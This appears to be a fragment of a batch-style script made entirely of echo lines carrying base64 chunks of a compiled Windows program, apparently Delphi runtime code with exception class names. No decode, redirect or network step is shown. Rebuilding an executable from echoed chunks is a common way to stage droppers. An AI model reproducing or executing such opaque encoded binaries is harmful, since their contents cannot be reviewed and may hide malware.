echo KC9AAEQvQACAL0AACUVJbnRFcnJvcovAFF9AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAUX0AAEAAAAHBeQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABEL0AA
echo gC9AAApFRGl2QnlaZXJvkGxfQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo bF9AABAAAABwXkAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQAALRVJh
echo bmdlRXJyb3LEX0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMRfQAAQAAAA
echo cF5AAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AADEVJbnRPdmVyZmxv
echo d41AACBgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIGBAABAAAAC4XUAA
echo nDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQAAKRU1hdGhFcnJvcpB4YEAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHhgQAAQAAAA1F9AAJwxQACoMUAA
echo rDFAALAxQACkMUAAKC9AAEQvQACAL0AACkVJbnZhbGlkT3CQ0GBAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAADQYEAAEAAAANRfQACcMUAAqDFAAKwxQACwMUAA
echo pDFAACgvQABEL0AAgC9AAAtFWmVyb0RpdmlkZShhQAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAKGFAABAAAADUX0AAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AA
echo RC9AAIAvQAAJRU92ZXJmbG93i8CAYUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAIBhQAAQAAAA1F9AAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AA
echo CkVVbmRlcmZsb3eQ2GFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADYYUAA
echo EAAAAKhcQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABgn0AAgC9AAA9FSW52YWxp
echo ZFBvaW50ZXI0YkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADRiQAAMAAAA
echo QFxAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AADEVJbnZhbGlkQ2Fz
echo dI1AAJBiQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkGJAAAwAAABAXEAA
echo nDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQAANRUNvbnZlcnRFcnJvcovA
echo 7GJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADsYkAAEAAAALhdQACcMUAA
echo qDFAAKwxQACwMUAApDFAACgvQABEL0AAgC9AABBFQWNjZXNzVmlvbGF0aW9ujUAA
echo TGNAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMY0AAEAAAALhdQACcMUAA
echo qDFAAKwxQACwMUAApDFAACgvQABEL0AAgC9AAApFUHJpdmlsZWdlkKRjQAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApGNAABAAAAC4XUAAnDFAAKgxQACsMUAA
echo sDFAAKQxQAAoL0AARC9AAIAvQAAORVN0YWNrT3ZlcmZsb3eQAGRAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAZEAAEAAAALhdQACcMUAAqDFAAKwxQACwMUAA
echo pDFAACgvQABEL0AAgC9AAAlFQ29udHJvbEOLwFhkQAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAWGRAAAwAAABAXEAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AA
echo RC9AAIAvQAANRVZhcmlhbnRFcnJvcovAtGRAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAC0ZEAADAAAAEBcQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABEL0AA
echo gC9AABBFQXNzZXJ0aW9uRmFpbGVkjUAAFGVAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAUZUAADAAAAEBcQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABEL0AA
echo gC9AAA5FQWJzdHJhY3RFcnJvcpBwZUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAHBlQAAMAAAAQFxAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AA
echo DkVJbnRmQ2FzdEVycm9ykMxlQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo zGVAABAAAABAXEAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQAAIRU9T
echo RXJyb3KNQAAkZkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACRmQAAMAAAA
echo QFxAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AAEkVTYWZlY2FsbEV4
echo Y2VwdGlvbpA8ZkAAEQMuNzQEAAAAABBAAEgAAAAAEEAACFN5c1V0aWxzi8BgZkAA
echo EQMuODQEAAAAABBAAEgAAAAAEEAACFN5c1V0aWxzi8D/////AQAAACQAAADYZkAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANhmQABEAAAADBBAAJwxQACoMUAA
echo rDFAALAxQACkMUAAKC9AAEQvQACcsUAAE1RUaHJlYWRMb2NhbENvdW50ZXLMg8DU
echo 6cNNAACDwNTpJ04AAIPA1OnHTAAAg8DU6VtNAACDRCQE1OmN6P//g0QkBNTpq+j/
echo /4NEJATU6bXo///MDWdAABdnQAAhZ0AA7WZAAPVmQAD9ZkAABWdAAAEAAABSjBB7
echo jx3bTJzfV+BxGT0/LGdAACwAAAAAAAAAtGdAAEhnQAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAC0Z0AAMAAAAAARQACcMUAAeE9AAIRPQACwMUAApDFAAJRPQABEL0AA
echo QLNAACRUTXVsdGlSZWFkRXhjbHVzaXZlV3JpdGVTeW5jaHJvbml6ZXKNQABVi+xT
echo idOJwsHqEGb384tdCGaJAWaJE1tdwgQAU1ZXi/mL8ovYVleLy7IBoURiQADouzYA
echo AOiOzP//X15bw4vAU1aL2IvD6AG+//+L8IvGM8mL0+jQwf//i8ZeW8ONQABTVleL
echo +ovwi8boltT//4vYi8eL0+i71///i9aLN4XbdBWKAjxhcgY8encCLCCIBkJGS4Xb
echo detfXlvDi8BTVleL+ovwi8boWtT//4vYi8eL0+h/1///i9aLN4XbdBWKAjxBcgY8
echo WncCBCCIBkJGS4XbdetfXlvDi8BWV1OJxonXCcB0A4tA/AnSdAOLUvyJwTnRdgKJ
echo 0TnJ86Z0Kope/4D7YXIIgPt6dwOA6yCKf/+A/2FyCID/encDgO8gOPt02A+2ww+2
echo 1ynQW19ew5A50HQZCcB0FwnSdBSLSPw7Svx1DOiT////hcB1A7ABwzHAw5BTVovy
echo i9iLxuin0///UIvG6J/V//9Qi8Pol9P//1CLw+iP1f//UGoAaAAEAADoKu7//4Po
echo Al5bw1NWi/KL2IvG6G/T//9Qi8boZ9X//1CLw+hf0///UIvD6FfV//9QagFoAAQA
echo AOjy7f//g+gCXlvDU1aL8ovYi9aLw+i5////hcAPlMBeW8OQU1ZXVYvqi/iLx+gd
echo 0///i/C7AQAAAOsBQzvzfAeAfB//IHb0O/N9CovF6GHQ///rF06AfDf/IHb4VYvO
echo K8tBi9OLx+hE1f//XV9eW8ONQAAIyXUXCcB5DvfY6AcAAACwLUFOiAbDuQoAAABS
echo VjHS9/FOgMIwgPo6cgOAwgeIFgnAdepZWinxKcp2EAHRsDAp1usDiAQySnX6iAbD
echo Vonmg+wQMclSMdLopP///4nyWOjM0P//g8QQXsONQAAIyXUwuQoAAAD3QAQAAACA
echo dCL/cAT/MIng9xwkg1QkBAD3XCQE6AoAAADGRv8tTkGDxAjDVoPsBNl8JALZPCRm
echo gQwkAA/ZLCRmiQwk2ej3QAQAAACAdCf/cAT/MIFkJAT///9/aP///39o/////99s
echo JAjfLCTYwt7Bg8QQ6wLfKN8EJNnBTtn43xwk3PmKBCQEMDw6cgIEB4gG2cHY05vf
echo 4J5z4dlsJAKDxATdw93C3cHdwFkp8SnKdhAp1rAwAdHrA4gEMkp1+ogGw5BVi+xW
echo ieaD7CAxyVAx0o1FCOge////ifJY6NrP//+DxCBeXcIIAIvAg/ogdgIx0laJ5oPs
echo IFG5EAAAAOiI/v//ifJY6LDP//+DxCBew41AAFNRi9qL1OiNvv//gzwkAHQCi8Na
echo W8OLwFNWUYvyi9iL1IvD6HC+//+JBoM8JAAPlMBaXlvDjUAAoYCHQQDo+tr//4XA
echo dSlqAbiAh0EAuQEAAACLFThmQADom9z//4PEBKGAh0EAujxsQADonc7//6GEh0EA
echo 6MPa//+FwHUpagG4hIdBALkBAAAAixVcZkAA6GTc//+DxAShhIdBALpMbEAA6GbO
echo ///DAP////8EAAAAVHJ1ZQAAAAD/////BQAAAEZhbHNlAAAAVYvsUVNWV8ZF/wCL
echo 8oX2fCBGi9iLRQiLQPyLE+gn/f//hMB0BsZF/wHrBoPDBE5144pF/19eW1ldw4vA
echo VYvsg8TwU4vaiUX8jVXwi0X86DkQAACL0ITSdBHbbfDYHRBtQADf4J4PlQPrSegB
echo ////VaGAh0EA6ALa//+L0KGAh0EA6Hr///9Zi9CE0nQFxgMB6yFVoYSHQQDo39n/
echo /4vQoYSHQQDoV////1mL0ITSdAPGAwCLwluL5V3DAAAAAAAA/////wEAAAAwAAAA
echo /////wIAAAAtMQAAU1aL8YvYhNJ0LOiJ/v//hNt0EYvGixWAh0EAixLoSs3//+sk
echo i8aLFYSHQQCLEug5zf//XlvDi8Yz0orTixSVLEFBAOgkzf//XlvDkFNWV4vai/iD
echo yP+L84PmA4P+Anc/i9OB4vAAAACD+kB3MmoAaIAAAABqA2oAi8Ml8AAAAMHoBIsE
echo hUBBQQBQiwS1NEFBAFCLx+gb0f//UOjN6f//X15bw5BTi9hqAGiAAAAAagJqAGoA
echo aAAAAMCLw+j00P//UOim6f//W8Po1////8OLwFNWV1GL+Yvyi9hqAI1EJARQV1ZT
echo 6FPq//+FwHUHxwQk/////4sEJFpfXlvDU1ZXUYv5i/KL2GoAjUQkBFBXVlPob+r/
echo /4XAdQfHBCT/////iwQkWl9eW8NVi+yDxPhTVovyi9iLRQiJRfiLRQyJRfxWjUX8
echo UItF+FBT6A3q//+JRfiLRfiLVfxeW1lZXcIIAFDo7uj//8OQU1ZXVYvyi9iLxug9
echo zv//i/iLw+g00P//i+iF/34oilw+/4TbdBuL04vF6KkBAACFwHQOi9eLxuisNwAA
echo PAJ1Bk9Phf9/2IvHXV9eW8ONQABTVleL+ovYi9O4GG9AAOid////i/BXjVYBuf//
echo /3+Lw+g30P//X15bwwAAAP////8CAAAAXDoAAFNWgcT4/v//i/KL2FSNRCQIUGgE
echo AQAAi8Pops///1DouOj//4vIjVQkBIvG6OfL//+BxAgBAABeW8OLwFWL7IPE6FOL
echo RQiFwHUCM8CNVfBSjVX0Uo1V+FKNVfxSUOhy6P//i9iLRfz3bfgz0olF6IlV7ItF
echo 9DPSUlCLReiLVezoBNf//4tNDIkBiVEEi0XwM9JSUItF6ItV7Ojq1v//i00QiQGJ
echo UQSLw1uL5V3CEACQifqJx7n/////MsDyrrj+////KciJ18OQVovwkujDt///i8Ze
echo w41AAFdWU4nGideJyzLAhcl0BfKudQFBKcuJ94nWifqJ2cHpAvOlidmD4QPzpKqJ
echo 0FteX8ONQABXVlOJ14nGicsxwAnJdC/yrinLidmJ1zHS86Z0IYpG/zxhcgY8encC
echo LCCKV/+A+mFyCID6encDgOogKdB021teX8OLwOsIhMl1AzPAw0CKCDrRdfLDjUAA
echo V1ZTCcB0RAnSdECJw4nXMsC5//////Ku99FJdC6Jzonfuf/////yrvfRKfF2HYnf
echo jV7/idas8q51EYnIV4nZ86ZficF17Y1H/+sCMcBbXl/DjUAAU4vYg8MEi8PoR7X/
echo /4kYg8AEW8NTVovYhdt1BTPAXlvDi8Po0P7//4vwRovG6M7///+LzovT6NX+//9e
echo W8OLwFNWV4PE2IvZi/KL+IP7H3YFux8AAACL00qLxuhsNQAAPAF1AUuLxIvLi9bo
echo oP7//8YEHACLxIlEJCDGRCQkBo1UJCCLBL1UQUEAM8nok/b//4PEKF9eW8NTiw10
echo dUEAgzkAdAyLHXR1QQCLG//TW8OwEOiFtf//W8ONQABTi9iLw+iqyP//W8NVi+yD
echo xJRTM9uJXexTVleJx4nOMcCJRfwDTRCJffgxwIlF9IlF8IlF7AnSdA05znQJrDwl
echo dA6qSnXzifgrRfjpIwMAADnOdPKsPCV06Y1e/old6IhF5zwtdQU5znTcrOh+AAAA
echo PDp1Cold9DnOdMus6+GJXeC7/////zwudQo5znS4rOhaAAAAiV3ciXXYUVLolQAA
echo AFqLXeApy3MCMduAfectdQopynMEAdEx0vOkh9kpynMEAdEx0rAg86qH2SnKcwQB
echo 0THS86SDffAAdApSjUXw6Bz///9aWYt12OlH////Mds8KnQiPDByPTw5dzlp2woA
echo AAAsMA+2wAHDOc50A6zr5FjpMP///4tF9DtFCH8S/0X0i10MgHzDBACLHMN0AjHb
echo Oc503KzDJN+IwbgBAAAAi130O10If1z/RfSLdQyNNN6LBg+2VgT/JJXtckAAfnNA
echo ADFzQAC3c0AAfnRAAOdzQABfdEAAP3RAADFzQAAxc0AAMXNAAPhzQAAjdEAAenRA
echo AMZzQAAxc0AA/3NAAEhzQAAxwOi7AQAAi1Xoi03YKdGLXfzozP3//411t4tV3IP6
echo IHYCMdKJy4DpRA+EEPf//7kQAAAAgPtYD4QC9///uQoAAACA+1UPhPT2///rs411
echo p4tV3InLg/oQdgIx0oDpRA+Ebvb//7kQAAAAgPtYD4Rg9v//uQoAAACA+1UPhFL2
echo ///pev///4D5Uw+Fcf///7kBAAAAw4D5Uw+FYv///2aDOAF2D4nCjUXw6I39//+L
echo dfDrSjHJw4D5Uw+FQf///4nGrA+2yOs9vmw8QADrBb7MPEAAA3X8gPlTD4Uh////
echo icKNRexTi138/9Zbi3XsifDrC4D5Uw+FBf///4nGCfZ0sotO/DtN3HcBw4tN3MOA
echo +VMPhen+//+JxleJxzLAi03c4wXyrnUBT4n5KfFfw4D5UA+Fyf7//7oIAAAAuRAA
echo AACNdafpivX//7cB6wK3AInGswCA+Ud0P7MBgPlFdDizAoD5RnQSswOA+U50C4D5
echo TQ+Fiv7//7MEuBIAAACLVdw5wnYlugIAAACA+U11Gw+2FYCGQQDrEotF3LoDAAAA
echo g/gSdgW4DwAAAFNQUo1Fl4nyD7bPi1386H8BAACJwY11l8NTUI1F7Itd/OhExf//
echo WFvD6Ov///9fXltbi+VdwgwAi8BVi+xTVleL8Yv6i9iF23QnhfZ0I4vG6J36//9Q
echo i0UMUItFCFCLzovDi9foWfz//8YEAwCLw+sCM8BfXltdwggAVYvsUYtNCJGH0egF
echo AAAAXcIEAJBVi+yBxATw//9Qg8T4U1aJTfiJVfyL8LsAEAAAi0X86FTH//89AAwA
echo AH0mi0X86EXH//9Qi0X4UItFCFCLTfyNhfjv//+6/w8AAOjl+///6wyLRfzoH8f/
echo /4vYi8OL00o7wnxD6zAD24vG6G3E//+LxovT6DDK//+LRfzo+Mb//1CLRfhQi0UI
echo UItN/IvTSosG6J77//+L00o7wn3Ji9aS6APK///rDo2V+O///4vOkegXxf//XluL
echo 5V3CBACNQABWMfaqCNt1BDHS6woJ0n0GsC332usGCOR0A4jgqpJQieMx0ve2aEFB
echo AIDCMIgTQ0kJwHXtCcl/6UuKA6o543X4WF7DkFWL7IPE1FdWU4lF/KB/hkEAiEX7
echo oH6GQQCIRfqheIZBAIlF9KB8hkEAiEXzoH2GQQCIRfLHRewAAAAAuBMAAACA+QB1
echo F4tFDIP4An0FuAIAAACD+BJ+BbgSAAAAiUUMULgPJwAAgH0QAnIDi0UIUI1F1Ohd
echo AgAAi338D7dF1C3/fwAAg/gCcxqJwehwAAAAjbRJXHdAAAN17LkDAAAA86TrLY11
echo 1w+2XRCA+wF0EID7BHcJD79F1DtFDH4CswCNHJ1Id0AAA13sixsDXez/04n4K0X8
echo W15f6fEBAAB1d0AA0XdAAAh4QAAIeEAAcnhAAElORk5BTqwIwHUDsDBOw4B91gB0
echo A7AtqsPo8f///w+/TdQx0jtNDH8dg/n9fBgJyX8asDCqgD4AdDqKRfuq99mwMPOq
echo 6xq5AQAAAEKsCMB0F6ri+KwIwHQTiMSKRftmq6wIwHQHquv4sDDzqgnSdAQxwOse
echo w+iV////6If///+KZftmq4tNDEnoef///6ri+LQri00Ig/kEdgIxybBFil3XD79V
echo 1EroIf7//8PoXv///4tVCIP6EnIFuhIAAAAPv03UCcl/BbAwqusqMduAfRACdAqJ
echo yEizA/bziOND6CT///+qSXQPS3X0ikX6hMB07aqzA+voCdJ0HIpF+4TAdAGq4wmw
echo MKpKdAxBdfno9f7//6pKdffDMduKXfO5AwAAAIB91gB0CIpd8rkPBAAAOMt2AojL
echo AOuNnJvVeEAAA13suQUAAACKAzxAdB5RUzwkdAc8KnQKqusM6A0AAADrBehN////
echo W1lD4tzDVot19IX2dAWLTvzzpF7DJCpAQEAqJEBAQCQgKkBAKiAkQEAoJCopQC0k
echo KkBAJC0qQEAkKi1AQCgqJClALSokQEAqLSRAQCokLUBALSogJEAtJCAqQCogJC1A
echo JCAqLUAkIC0qQCotICRAKCQgKikoKiAkKYvlXcIMAJBVi+yDxOBXVlOJw4nWx0X8
echo AAAAAID5AHQK6DEBAADpAAIAAOgFAAAA6fYBAABmi0YIicIl/38AAHQePf9/AAB1
echo Imb3RgYAgHQRgz4AdQmBfgQAAACAdANAMdLGQwMA6c0AAADbLi3/PwAAacAQTQAA
echo wfgQQIlF+LgSAAAAK0X42eFTi1386EKx//9b2fyLffzbr1xBQQDY2ZvdffabZvdF
echo 9gBBdAnat2hBQQD/RfjfdeiNewO6CQAAAJuKRCrniMTA6ASA5A9mBTAwZqtKdesy
echo wKqLffgDfQh5BzHA6Xf///87fQxyA4t9DIP/EnMngHw7AzVyJcZEOwMAT3gN/kQ7
echo A4B8OwM5d+3rH2bHQwMxAP9F+OsUvxIAAADGRDsDAE94GYB8OwMwdPFmi1YIi0X4
echo ZsHqD2aJA4hTAsMx0uvuCgAAAGQAAADoAwAAECcAAIsGi1YEicEJ0Q+EtwAAAAnS
echo eQf32vfYg9oAMcmLfQgJ/30CMf+D/wR8H78EAAAAQS0AAGSngdqztuANc/JJBQAA
echo ZKeB0rO24A2JReCJVeTfbeCJ+rgEAAAAKdB0Cot9/Nq0h3t6QADfdeiNewObCcl1
echo G7kJAAAAikQp54jEwOgEdR6I4CQPdR9JdezrOYjIBDCquQkAAACKRCnniMTA6AQE
echo MKqI4CQPBDCqSXXqifiNTBMDKcjGBwBPgD8wdPeLVgTB6h/rBzHAMdKIQwNmiQOI
echo UwLDW15fi+VdwggAVYvsg8T0V1ZTicaJ18dF/AAAAACgf4ZBAIhF+4nLm9l9+Jvb
echo 4tktbEFBANnu6IUAAACKPoD/K3QFgP8tdQFGifHofAAAADHSigY6Rft1CEbobQAA
echo APfaOfF0T4oGJN88RXUKRlLodAAAAFgBwuhFAAAAgD4AdTOJ0ID7AXUDg8AEU4td
echo /OgWr///W4D/LXUC2eCA+wB0BN8/6wLbP5vf4GapCQB1BrAB6wTd2DHAm9vi2W34
echo m+tWrAjAdAQ8IHT3TsMxwDHSrCw6BApzD9oNaEFBAIlF9NpF9ELr6k7DMcAx0ooO
echo gPkrdAWA+S11AUaKBiw6BApzDkZr0goBwoH69AEAAHLqgPktdQL32sNbXl+L5V3D
echo VYvsg8TAU4vYagBqD2oAjVUIjUXAM8no0Pn//4vIjVXAi8PojL7//1uL5V3CDACQ
echo VYvsg8TAU4vYagBqAGoAjVUIjUXAsQHooPn//4vIjVXAi8PoXL7//1uL5V3CCACQ
echo U1aL8ovYi8Po88H//4vWM8nodv7//15bw41AAFNWg8T0i/KL2IvD6NTB//+L1DPJ
echo 6Ff+//+EwHQG2ywk3R6bg8QMXlvDjUAAU1aDxPSL8ovYi8PoqMH//4vUM8noK/7/
echo /4TAdAbbLCTZHpuDxAxeW8ONQABTVovyi9iLw+h/wf//i9axAegC/v//XlvDjUAA
echo VYvsUzHbicHdRQjYi3BBQQCD7AjfPCSbWFoJ0nkR99r32IPaAPezdEFBAPfY6wb3
echo s3RBQQAFWpUKAIkRiUEEW13CCABVi+yDxPhWi3UMxkX/AGaD+BhzTWaD+jxzR2aD
echo +TxzQWaB/ugDczoPt8BpwIDuNgAPt9Jp0mDqAAADwg+30WnS6AMAAAPCD7fWA8KJ
echo RfjbRfjYNSB+QACLRQjdGJvGRf8BikX/XllZXcIIAACAy6RMVYvsg8T0U1ZXi/mL
echo 8ovYjUX8UP91EP91DI1F9Ogr////i0X0jU3+Zrpg6uiI6f//VovLD7dF/ma6PADo
echo eOn//4tFCFCLzw+3RfxmuugD6GXp//9fXluL5V3CDABTVovID7fBg+ADhcB1IQ+3
echo 2YvDvmQAAAAz0vf2hdJ1FIvDuZABAAAz0vfxhdJ0BTPAXlvDsAFeW8ONQABVi+yD
echo xPhTVleL2Yv6ZolF/sZF/QBmi0X+6Kb///+D4H+NBECNNMXUQEEAZoN9/gEPgoYA
echo AABmgX3+Dyd3fmaD/wFyeGaD/wx3cmaD+wFybA+3x2Y7XEb+d2IPt8dIhcB+DrkB
echo AAAAZgNcTv5BSHX3D7dN/kmLwb5kAAAAmff+afFtAQAAi9GF0nkDg8IDwfoCA/Ir
echo 8IvBuZABAACZ9/kD8A+3wwPwge5alQoAiXX420X4i0UI3RibxkX9AYpF/V9eW1lZ
echo XcIEAFWL7IPE6FNWiU30iVX4iUX8i10I/3UQ/3UMjUXo6Mr9//+LTeyFyX8ki0X8
echo ZscAAACLRfhmxwAAAItF9GbHAAAAZscDAAAz0unyAAAAi8G+BwAAAJn3/kJmiRNJ
echo ZrsBAIH5sToCAHwTgemxOgIAZoHDkAGB+bE6AgB97Y1F8lCNRfBmuqyOkejM5///
echo ZoN98AR1Cmb/TfBmgUXyrI5ma0XwZGYD2I1F8lCNTfAPt0XyZrq1Beif5///ZotF
echo 8MHgAmYD2I1F8lCNTfAPt0XyZrptAeiB5///ZoN98AR1Cmb/TfBmgUXybQFmA13w
echo i8PoCf7//4vQM8CKwo0EQI00xdRAQQBmuAEAD7fIZotMTv5miU3wZotN8mY7TfBy
echo C2aLTfBmKU3yQOvfi038ZokZi034ZokBZotF8kCLTfRmiQGLwl5bi+VdwgwAjUAA
echo VYvsUVaL8P91DP91CI1F/lCLxuic/v//XlldwggAi8BVi+yDxPj/dQz/dQiNRfjo
echo bPz//4tF/LkHAAAAmff5i8JAWVldwggAg8TwVOjn1v//ZosEJIPEEMONQABVi+xT
echo i00IuwABAAArmfz+//87030Ci9qF23Qai1UIi5L8/v//i00IjZQRAP///4vL6E6m
echo //+LRQgBmPz+//9bXcOLwFWL7FOL2ItFCFCLw+hfu///i9CLw+ii////WVtdw4vA
echo VYvsg8TgU1aL8ovYi0UIUGoEiXXgxkXkAIld6MZF7ACNReBQagG5eEFBAI1F8LoQ
echo AAAA6NTv//+L0I1F8Oha////WV5bi+Vdw41AAFWL7FOLRQiDwPyLEOsC/wCLCIoJ
echo i10IOkv7dPKLACvCQItVCIlC9Ftdw4vAVYvsi0UIgHjtAHUqi0UIi0AI/3AM/3AI
echo i0UIjUjui0UIjVDwi0UIg8Dy6Jn+//+LRQjGQO0BXcNVi+yLRQiAeOMAdTGLRQiL
echo QAj/cAz/cAiLRQiDwORQi0UIjUjmi0UIjVDoi0UIg8Dq6K77//+LRQjGQOMBXcOQ
echo VYvsgcTo/v//U1YzyYmN6P7//4lN/Ivai/AzwFVozoNAAGT/MGSJIIvD6JW3//+L
echo RQhmi0DyZolF7ItFCGaLQPBmiUXui0UIZotA7maJRfKNRfy65INAAOj/t///aAAB
echo AACNhez+//9Qi0X86O+7//9QjUXsUGoE6EPV//9Q6OXU//+FwA+EogAAAIvDjZXs
echo /v//uQABAADol7n//04PhYkAAAChPIdBAIPoBHQig+gNdXpTiwO6AQAAAOjsJAAA
echo i8iLA7oBAAAA6PK7///rXYM9QIdBAAF1VIsD6IC5//+L0IsD6E8jAACD+AR1P4sD
echo ugMAAADoTiQAAIvwjYXs/v//A/BOjYXo/v//i9boqrj//4uF6P7//7oCAAAA6Iok
echo AACLyIvDi9boh7f//zPAWllZZIkQaNWDQACNhej+///of7b//41F/Oh3tv//w+mZ
echo sP//6+VeW4vlXcMA/////wIAAABnZwAAVYvsgcTs/v//U1YzyYlN/Ivai/AzwFVo
echo xoRAAGT/MGSJIIvD6DO2//+LRQhmi0DyZolF7ItFCGaLQPBmiUXui0UIZotA7maJ
echo RfKD/gJ/D41F/LrchEAA6Ji2///rDY1F/LrohEAA6Im2//9oAAEAAI2F7P7//1CL
echo Rfzoebr//1CNRexQagTozdP//1Dob9P//4XAdDOLw42V7P7//7kAAQAA6CW4//9O
echo dR6LA4A4MHUXU4sD6D+4//+LyEmLA7oCAAAA6JC6//8zwFpZWWSJEGjNhEAAjUX8
echo 6H+1///D6aGv///r8F5bi+VdwwD/////AgAAAHl5AAD/////BAAAAHl5eXkAAAAA
echo VYvsg8TYU1Yz0olV2IlV3IlF/DPAVWhxjEAAZP8wZIkgg338AA+EOwcAAItFCIO4
echo +P7//wIPjSsHAACLRQj/gPj+//+zIMZF7QDGReMAxkXiAOn5BgAAiEX7ikX7Jf8A
echo AAAPowUEQUEAcymLRQhQi0X86CUjAACL0ItF/Oi7+///WYtF/OgyIwAAiUX8syDp
echo vAYAAItF/OggIwAAiUX8ikX7i9CAwp+A6hpzAiwgi9CAwr+A6hpzDTxNdQeA+0h1
echo ArBOi9gl/wAAAIPA3oP4OA+HaAYAAIqA04VAAP8khQyGQAAPAAAAAA8AAAAAAAAA
echo DQAAAAAAAAAAAAAOAAAAAAAACwAMBQMAAgYAAAAABAcAAAAACAkAAAAAAQoujEAA
echo TIZAAJuGQADIhkAA9YZAAFqHQAAHiEAAAYlAADKJQABjiUAAmIlAAMmJQAA8i0AA
echo motAAMCLQADfi0AAVeiK+///WVXor/v//1mDffQCfyOLRQhQD7dF8rlkAAAAM9L3
echo 8YvCugIAAADoE/v//1npvQUAAItFCFAPt0XyugQAAADo+/r//1nppQUAAFXoO/v/
echo /1lV6GD7//9Zi0UIUFWNVdyLRfTox/v//1mLRdzorvr//1npeAUAAFXoDvv//1lV
echo 6DP7//9Zi0UIUFWNVdiLRfToAv3//1mLRdjogfr//1npSwUAAFXo4fr//1lV6Ab7
echo //9Zi0X0SIPoAnIEdBjrMItFCFAPt0Xwi1X06HD6//9Z6RoFAACLRQhQD7dF8IsE
echo hZyGQQDoNvr//1npAAUAAItFCFAPt0XwiwSFzIZBAOgc+v//WenmBAAAVeh8+v//
echo WYtF9EiD6AJyCnQlSHRJSHRt639V6I76//9Zi0UIUA+3Re6LVfToBfr//1nprwQA
echo AItFCFCLRQj/cAz/cAjoTfn//w+3wIsEhfyGQQDovvn//1npiAQAAItFCFCLRQj/
echo cAz/cAjoJvn//w+3wIsEhRiHQQDol/n//1npYQQAAItFCFChhIZBAOgD/f//WelN
echo BAAAi0UIUKGIhkEA6O/8//9Z6TkEAABV6M/5//9ZVegs+v//WcZF4QCLdfzplQAA
echo ACX/AAAAD6MFBEFBAHMLi8bodiAAAIvw63wzwIoGg/hIfxN0e4PoInRjg+gFdF6D
echo 6Bp0Dutfg+hhdAeD6Ad0YOtTgH3hAHVNuoCMQAC5BQAAAIvG6K/n//+FwHQquoiM
echo QAC5AwAAAIvG6Jrn//+FwHQVuoyMQAC5BAAAAIvG6IXn//+FwHUZxkXiAesTikXh
echo NAGIReFGigaEwA+FYf///2aLReqAfeIAdBVmhcB1Bma4DADrCmaD+Ax2BGaD6AyD
echo ffQCfgfHRfQCAAAAi1UIUg+3wItV9OiV+P//Wek/AwAAVejV+P//WVXoMvn//1mD
echo ffQCfgfHRfQCAAAAi0UIUA+3ReiLVfToZPj//1npDgMAAFXopPj//1lV6AH5//9Z
echo g330An4Hx0X0AgAAAItFCFAPt0Xmi1X06DP4//9Z6d0CAABV6HP4//9Zg330AXUU
echo i0UIUKGYhkEA6HL7//9Z6bwCAACLRQhQoZyGQQDoXvv//1npqAIAAFXoPvj//1lV
echo 6Jv4//9Zg330A34Hx0X0AwAAAItFCFAPt0Xki1X06M33//9Z6XcCAABV6HH4//9Z
echo i3X8TrqAjEAAuQUAAACLxuhD5v//hcB1KGaDfeoMcgODxgOLRQhQugIAAACLxugp
echo 9///WYNF/ATGReIB6S8CAAC6iIxAALkDAAAAi8boBub//4XAdShmg33qDHIDg8YC
echo i0UIULoBAAAAi8bo7Pb//1mDRfwCxkXiAenyAQAAuoyMQAC5BAAAAIvG6Mnl//+F
echo wHU0ZoN96gxzEYtFCFChkIZBAOj49v//WesPi0UIUKGUhkEA6Of2//9Zg0X8A8ZF
echo 4gHpqQEAALqUjEAAuQQAAACLxuiA5f//hcB1MlXoVvf//1mLRQhQi0UI/3AM/3AI
echo 6Cv2//8Pt8CLBIUYh0EA6Jz2//9Zg0X8A+liAQAAupyMQAC5AwAAAIvG6Dnl//+F
echo wHUyVegP9///WYtFCFCLRQj/cAz/cAjo5PX//w+3wIsEhfyGQQDoVfb//1mDRfwC
echo 6RsBAACLRQhQjUX7ugEAAADo9vX//1npBAEAAFXomvb//1mLRQhQoYSGQQDon/n/
echo /1lV6Oj2//9ZZoN96gB1EmaDfegAdQtmg33mAA+EzgAAAItFCFC4oIxAALoBAAAA
